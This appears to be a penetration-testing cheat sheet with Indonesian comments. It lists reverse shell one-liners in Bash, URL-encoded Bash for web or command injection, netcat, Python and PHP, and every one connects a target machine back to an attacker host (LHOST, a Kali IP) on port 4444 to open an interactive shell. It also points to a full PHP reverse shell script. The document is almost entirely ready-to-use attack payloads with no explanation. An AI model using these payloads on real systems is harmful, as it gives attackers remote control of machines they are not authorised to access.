# Reverse Shell Payloads

> LHOST = IP Kali

## Bash
```bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
```

## Bash (URL-encoded untuk web/cmd injection)
```text
bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<LHOST>/4444%200>%261'
```

## Netcat
```bash
nc -e /bin/bash <LHOST> 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
```

## Python
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## PHP (one-liner)
```bash
php -r '$s=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Versi lengkap: [pentestmonkey php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell)
Atau cek `php-reverse-shell.php` di repository ini.
